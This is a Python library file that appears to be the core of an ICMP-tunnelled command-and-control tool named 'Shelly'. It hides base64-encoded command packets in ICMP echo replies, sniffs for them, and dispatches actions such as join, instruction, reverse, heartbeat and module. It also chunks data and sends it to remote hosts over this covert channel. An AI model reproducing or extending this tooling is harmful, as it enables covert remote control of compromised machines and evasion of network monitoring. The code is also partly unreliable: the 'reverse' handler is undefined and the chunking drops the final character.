"""
Shelly lib
Vaughn Woerpel (vaughnw128/apicius)
"""

from scapy.all import sr,IP,ICMP,Raw,sniff,packet
import socket
import psutil
import ast
import base64
import time

TTL = int(64)
ICMP_ID = int(12800)

# Sets a max data size for transmitted commands/misc data
# Works for truncation
MAX_DATA_SIZE = 400

class Host:
    """
    Host class
     
    Generic host class to gather various info like id, ip, interface as well as control
    base sniffing and the send command
    """

    def __init__(self):
        # Sets up some base information
        self.id = str(round((time.time())*10**6))
        self.ip = self.get_local_ip()
        self.iface = self.get_iface(self.ip)

    def __str__(self) -> str:
        """
        Generates a quick report of host information
        """

        report =  f"[ Host Information ]\n"
        report += f" -- IP: {self.ip}\n"
        report += f" -- Interface: {self.iface}\n"

        return report

    """
    Sniffer callbackss
    """

    def sniff_callback(self, packet: packet) -> None:
        """
        Generic sniff callback function 
        
        Checks to see if the packet is valid in a few different ways
        then decodes it and passes it on to other functions
        """

        # Checks to see if the type and id are valid as well as data contents
        if packet[ICMP].type != 0:
            return
        elif packet[IP].src == self.ip:
            return
        elif packet[ICMP].id != ICMP_ID:
            return
        elif not packet[Raw].load:
            return

        # Decodes the shellpack to a dict
        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        unpacked['ip'] = packet[IP].src

        # Matches over the different modules
        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case "instruction":
                self.instruction(unpacked)
            case "reverse":
                self.reverse(unpacked)
            case "heartbeat":
                self.heartbeat_response(unpacked)
            case "module":
                self.run_module(unpacked)
            case _:
                return
    
    """
    Stubbed out sniffer responses
    """

    def join(self, shellpack: dict) -> None:
        pass

    def run_module(self, shellpack: dict) -> None:
        pass

    def heartbeat_response(self, shellpack: dict) -> None:
        pass

    def instruction(self, shellpack: dict) -> None:
        pass
            
    
    """
    Helper functions
    """
    
    def encode(self, shellpack: dict) -> str:
        """
        Small helper for encoding shellpacks
        """

        encoded_shellpack = str(shellpack).encode()
        encoded_shellpack = base64.b64encode(encoded_shellpack)

        return encoded_shellpack

    def build_shellpacks(self, command: str,  data: str | None = None, option: str | None = None) -> list[dict]:
        """
        Builds shellpacks from the data originally passed to the send command

        Truncates the data and splits it over multiple shellpacks if the 
        data size exceeds specification
        
        """
        
        shellpacks = []

        shellpack = {
            "id": self.id,
            "command": command,
            "option": option,
            "data" : data
            }
        
        # Sets default to complete
        shellpack['option'] = "COMPLETE"
        encoded_shellpack = str(shellpack).encode()
        encoded_shellpack = base64.b64encode(encoded_shellpack)

        # Splits the data if it's above the max data size
        if data is not None and len(data) > MAX_DATA_SIZE:
            num_shellpacks = ( len(data) // MAX_DATA_SIZE ) + 1

            for i in range(num_shellpacks):
                if i == num_shellpacks-1:
                    shellpack['data'] = data[MAX_DATA_SIZE*i:-1]    
                    shellpack['option'] = "COMPLETE"
                else:
                    shellpack['data'] = data[MAX_DATA_SIZE*i:MAX_DATA_SIZE*(i+1)]
                    shellpack['option'] = "TRUNCATED"
                
                encoded_shellpack = str(shellpack).encode()
                encoded_shellpack = base64.b64encode(encoded_shellpack)

                shellpacks.append(encoded_shellpack)
        else:
            shellpacks = [encoded_shellpack]

        return shellpacks

    def send(self, ip, command: str, data: str | None = None, option: str | None = None) -> bool:
        """
        Send function

        Coordinates the sending of shellpacks by first building them and then sending them out
        """
        
        shellpacks = self.build_shellpacks(command, data)

        for shellpack in shellpacks:
            data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
            sr(data, timeout=0, verbose=0)

    def get_iface(self, ip: str) -> str:
        """
        Uses psutil to get the interface given the IP
        """

        nics = psutil.net_if_addrs()
        iface = [i for i in nics for j in nics[i] if j.address==ip and j.family==socket.AF_INET][0]
        return iface
        
    def get_local_ip(self) -> str:
        """
        Sends a connection out just to grab the IP
        """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        try:
            s.connect(("192.255.255.255", 1))
            ip = s.getsockname()[0]
        except:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
